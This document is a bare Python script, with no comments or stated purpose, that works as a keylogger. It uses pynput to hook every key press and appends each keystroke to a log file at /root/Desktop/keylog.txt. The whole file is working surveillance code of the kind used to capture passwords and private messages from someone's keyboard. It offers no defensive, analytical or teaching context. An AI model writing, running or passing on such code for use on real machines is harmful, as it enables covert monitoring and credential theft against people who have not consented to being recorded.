import logging
from pynput.keyboard import Key,Listener

logging.basicConfig(filename=('/root/Desktop/keylog.txt'),level=logging.DEBUG,format='[%(message)s]')

def press(key):
    logging.info("{0}".format(key))

with Listener(on_press=press) as listener:
    listener.join()